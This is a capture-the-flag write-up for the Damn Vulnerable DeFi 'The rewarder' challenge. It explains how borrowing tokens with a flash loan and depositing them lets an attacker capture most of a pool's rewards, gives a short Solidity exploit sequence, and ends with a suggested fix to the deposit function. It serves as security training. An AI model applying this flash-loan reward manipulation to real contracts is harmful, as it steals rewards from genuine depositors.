# Challenge #5 - The rewarder

There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.

Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!

You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.

Oh, by the way, rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans?

    [See the contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.2.0/contracts/the-rewarder)
    [Complete the challenge](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/the-rewarder/the-rewarder.challenge.js)

# Solution

To solve this challenge you need to take a flashloan, and then deposit it in the rewardPool. This will count your deposit towards the reward. After you receive the reward, you can pay back the flashloan.

```solidity
//approve
liquidityToken.approve(address(theRewardPool), amount)

//deposit
theRewardPool.deposit(amount)

//withdraw
theRewardPool.withdraw(amount)

//return the loan back
liquidityToken.transfer(address(flashLoanerPool), amount)

//send the tokens back to owner
rewardToken.transfer(owner, rewardToken.balanceOf(address(this)))
```

One way to resolve this vulnerability, is to have the snapshot happen in the deposit function, prior to the token mint.

```solidity
function deposit(uint256 amountToDeposit) external {
    require(amountToDeposit > 0, "Must deposit tokens");

    if (isNewRewardsRound()) {
        _recordSnapshot();
    }

    accToken.mint(msg.sender, amountToDeposit);

    distributeRewards();

    require(liquidityToken.transferFrom(msg.sender, address(this), amountToDeposit));
}

```
